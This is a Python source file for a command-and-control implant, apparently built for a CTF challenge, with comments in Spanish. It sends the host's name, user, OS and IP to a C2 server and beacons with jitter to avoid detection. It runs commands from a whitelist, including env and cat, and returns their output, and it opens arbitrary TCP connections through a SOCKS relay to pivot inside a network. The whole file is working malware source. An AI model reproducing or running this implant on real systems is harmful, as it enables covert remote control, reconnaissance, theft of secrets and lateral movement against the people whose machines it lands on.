"""Implant (agente) del C2 para el reto CTF SecOpsDays.

Flujo:
  1. Recolecta información básica del host.
  2. Se registra en el servidor (obtiene agent_id).
  3. Bucle: envía heartbeat, solicita tarea, la ejecuta (whitelist) y devuelve
     el resultado.
  4. Si hay canales SOCKS activos, relay de datos bidireccional.

Solo ejecuta comandos de una whitelist y NUNCA usa shell=True, de modo que no
hay inyección de comandos. Pensado para uso en CTF / entornos autorizados.
"""
import base64
import getpass
import os
import platform
import random
import shlex
import socket
import subprocess
import sys
import time
import uuid

import requests
import yaml

# --- Configuración desde profile YAML -----------------------------------------
def load_profile_config():
    """Carga configuración desde el profile YAML."""
    profile_path = os.environ.get("C2_PROFILE", "profiles/default.yaml")
    if not os.path.exists(profile_path) and hasattr(sys, "_MEIPASS"):
        profile_path = os.path.join(sys._MEIPASS, "profiles/default.yaml")
    try:
        with open(profile_path) as f:
            return yaml.safe_load(f)
    except FileNotFoundError:
        return {}


_profile = load_profile_config()
_agent_config = _profile.get("agent", {})
_listener_config = _profile.get("listener", {})
_default_host = _listener_config.get("host", "127.0.0.1")
_default_port = _listener_config.get("port", 8080)
_default_protocol = _listener_config.get("protocol", "http")
_default_url = f"{_default_protocol}://{_default_host}:{_default_port}"

# Configuración (override por variables de entorno)
C2_URL = os.environ.get("C2_URL", _default_url).rstrip("/")
AUTH_TOKEN = os.environ.get("C2_AUTH_TOKEN", "supersecret-ctf-token")
HEARTBEAT_INTERVAL = int(
    os.environ.get("C2_HEARTBEAT_INTERVAL", _agent_config.get("sleep", 30))
)
JITTER_PERCENT = int(os.environ.get("C2_JITTER", _agent_config.get("jitter", 50)))
COMMAND_TIMEOUT = int(
    os.environ.get("C2_COMMAND_TIMEOUT", _agent_config.get("timeout", 15))
)
RETRY_DELAY = int(os.environ.get("C2_RETRY_DELAY", _agent_config.get("retry_delay", 5)))

# Whitelist local por plataforma (espejo de la del servidor) como defensa en profundidad.
_WINDOWS_COMMANDS = {
    "whoami",
    "hostname",
    "ipconfig",
    "dir",
    "tasklist",
    "net",
    "systeminfo",
    "echo",
    "type",
    "ping",
    "cat",
    "ps",
}

_LINUX_COMMANDS = {
    "whoami",
    "hostname",
    "id",
    "uname",
    "pwd",
    "ls",
    "cat",
    "ps",
    "env",
    "date",
    "uptime",
    "df",
}

ALLOWED_COMMANDS = (
    _WINDOWS_COMMANDS if platform.system() == "Windows" else _LINUX_COMMANDS
)

HEADERS = {"X-Auth-Token": AUTH_TOKEN, "Content-Type": "application/json"}

# Canales SOCKS activos: channel_id -> socket remoto
active_socks_channels = {}


def generate_id():
    """ID estable por host derivado del hostname + dirección MAC."""
    seed = f"{socket.gethostname()}-{uuid.getnode()}"
    return str(uuid.uuid5(uuid.NAMESPACE_DNS, seed))


def local_ip():
    """Mejor estimación de la IP local saliente."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.connect(("8.8.8.8", 80))
        return sock.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        sock.close()


def collect_info():
    return {
        "agent_id": generate_id(),
        "hostname": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()}",
        "username": getpass.getuser(),
        "ip": local_ip(),
    }


def run_command(command):
    """Ejecuta un comando de la whitelist sin shell. Devuelve la salida (str).

    También maneja comandos SOCKS especiales que no están en la whitelist.
    """
    # Comandos SOCKS especiales
    if command.startswith("SOCKS_CONNECT "):
        return _handle_socks_connect(command)
    if command.startswith("SOCKS_DATA "):
        return _handle_socks_data(command)

    # Comandos normales (whitelist)
    try:
        parts = shlex.split(command)
    except ValueError as exc:
        return f"[implant] comando mal formado: {exc}"

    if not parts or parts[0] not in ALLOWED_COMMANDS:
        return f"[implant] comando no permitido: {command!r}"

    try:
        proc = subprocess.run(
            parts,
            capture_output=True,
            text=True,
            timeout=COMMAND_TIMEOUT,
            shell=False,
        )
        return (proc.stdout + proc.stderr).strip() or "[implant] (sin salida)"
    except subprocess.TimeoutExpired:
        return f"[implant] timeout tras {COMMAND_TIMEOUT}s"
    except Exception as exc:
        return f"[implant] error: {exc}"


def _handle_socks_connect(command):
    """Abre conexión TCP al target remoto para SOCKS5 relay.

    Formato: SOCKS_CONNECT <channel_id> <host> <port>
    """
    parts = command.split()
    if len(parts) != 4:
        return "[implant] SOCKS_CONNECT format: SOCKS_CONNECT <channel_id> <host> <port>"

    channel_id = parts[1]
    target_host = parts[2]
    try:
        target_port = int(parts[3])
    except ValueError:
        return f"[implant] invalid port: {parts[3]}"

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_host, target_port))
        active_socks_channels[channel_id] = sock
        log_socks(f"CONNECTED to {target_host}:{target_port} (channel={channel_id})")

        # Reportar al servidor que la conexión fue exitosa
        try:
            requests.post(
                f"{C2_URL}/socks/connected/{channel_id}",
                headers=HEADERS,
                timeout=5,
            )
        except requests.RequestException:
            pass

        return f"SOCKS_CONNECTED {channel_id}"
    except Exception as exc:
        return f"[implant] SOCKS_CONNECT failed: {exc}"


def _handle_socks_data(command):
    """Envía datos a un canal SOCKS remoto.

    Formato: SOCKS_DATA <channel_id> <base64_data>
    """
    parts = command.split(" ", 2)
    if len(parts) != 3:
        return "[implant] SOCKS_DATA format: SOCKS_DATA <channel_id> <base64_data>"

    channel_id = parts[1]
    try:
        data = base64.b64decode(parts[2])
    except Exception:
        return "[implant] invalid base64 data"

    sock = active_socks_channels.get(channel_id)
    if not sock:
        return f"[implant] channel {channel_id} not found"

    try:
        sock.sendall(data)
        return f"SOCKS_SENT {len(data)} bytes"
    except Exception as exc:
        return f"[implant] SOCKS send failed: {exc}"


def socks_relay_loop():
    """Relay bidireccional para canales SOCKS activos.

    Lee datos del socket remoto y los envía al servidor C2.
    Consulta datos pendientes del servidor y los envía al socket remoto.
    """
    for channel_id in list(active_socks_channels.keys()):
        sock = active_socks_channels.get(channel_id)
        if not sock:
            continue

        try:
            # 1. Leer datos del target remoto -> enviar al servidor
            sock.settimeout(0.1)
            try:
                data = sock.recv(65536)
                if data:
                    encoded = base64.b64encode(data).decode("ascii")
                    requests.post(
                        f"{C2_URL}/socks/data/{channel_id}",
                        headers=HEADERS,
                        json={"data": encoded},
                        timeout=5,
                    )
            except socket.timeout:
                pass
            except socket.error:
                log_socks(f"channel {channel_id}: socket error reading from target")
                _close_socks_channel(channel_id)
                return

            # 2. Consultar datos pendientes del servidor -> enviar al target
            resp = requests.get(
                f"{C2_URL}/socks/data/{channel_id}",
                headers=HEADERS,
                timeout=5,
            )
            if resp.status_code == 200:
                body = resp.json()
                raw = body.get("data")
                if raw:
                    decoded = base64.b64decode(raw)
                    sock.sendall(decoded)

        except requests.RequestException:
            pass
        except Exception as exc:
            log_socks(f"channel {channel_id} relay error: {exc}")


def _close_socks_channel(channel_id):
    """Cierra un canal SOCKS local."""
    sock = active_socks_channels.pop(channel_id, None)
    if sock:
        try:
            sock.close()
        except Exception:
            pass
        log_socks(f"channel {channel_id} closed")


def log_socks(msg):
    """Log de eventos SOCKS."""
    print(f"[implant][SOCKS] {msg}", file=sys.stderr)


def calculate_jitter_sleep(base_sleep, jitter_percent):
    """Calcula el sleep con jitter aleatorio.

    Args:
        base_sleep: Intervalo base en segundos
        jitter_percent: Porcentaje de jitter (ej: 50 = ±50%)

    Returns:
        Tiempo de sleep aleatorio en segundos
    """
    jitter_multiplier = random.uniform(
        1 - (jitter_percent / 100),
        1 + (jitter_percent / 100),
    )
    return max(1, int(base_sleep * jitter_multiplier))


def register():
    """Registra el agente en el servidor y devuelve el agent_id asignado."""
    info = collect_info()
    try:
        resp = requests.post(
            f"{C2_URL}/register",
            headers=HEADERS,
            json=info,
            timeout=10,
        )
        resp.raise_for_status()
        data = resp.json()
        agent_id = data.get("agent_id")
        print(f"[implant] Registrado como {agent_id}", file=sys.stderr)
        return agent_id
    except requests.RequestException as exc:
        print(f"[implant] Error de registro: {exc}", file=sys.stderr)
        return None


def pull_task(agent_id):
    """Consulta si hay tareas pendientes para este agente."""
    try:
        resp = requests.get(
            f"{C2_URL}/task/{agent_id}",
            headers=HEADERS,
            timeout=10,
        )
        resp.raise_for_status()
        return resp.json().get("task")
    except requests.RequestException:
        return None


def send_result(agent_id, task_id, output):
    """Envía el resultado de una tarea al servidor."""
    try:
        resp = requests.post(
            f"{C2_URL}/result/{agent_id}",
            headers=HEADERS,
            json={"task_id": task_id, "output": output},
            timeout=10,
        )
        resp.raise_for_status()
        return True
    except requests.RequestException:
        return False


def main():
    print("[implant] Iniciando agente...", file=sys.stderr)
    print(f"[implant] Jitter: ±{JITTER_PERCENT}%", file=sys.stderr)
    while True:
        agent_id = register()
        if agent_id:
            break
        print(
            f"[implant] Reintentando registro en {RETRY_DELAY}s...", file=sys.stderr
        )
        time.sleep(RETRY_DELAY)

    while True:
        # heartbeat
        try:
            requests.post(
                f"{C2_URL}/heartbeat",
                headers=HEADERS,
                json={"agent_id": agent_id},
                timeout=10,
            )
        except requests.RequestException:
            pass

        task = pull_task(agent_id)
        if task:
            command = task.get("command", "")
            output = run_command(command)
            send_result(agent_id, task.get("task_id"), output)

        # Relay de canales SOCKS activos
        if active_socks_channels:
            socks_relay_loop()

        # Sleep con jitter
        sleep_time = calculate_jitter_sleep(HEARTBEAT_INTERVAL, JITTER_PERCENT)
        time.sleep(sleep_time)


if __name__ == "__main__":
    main()
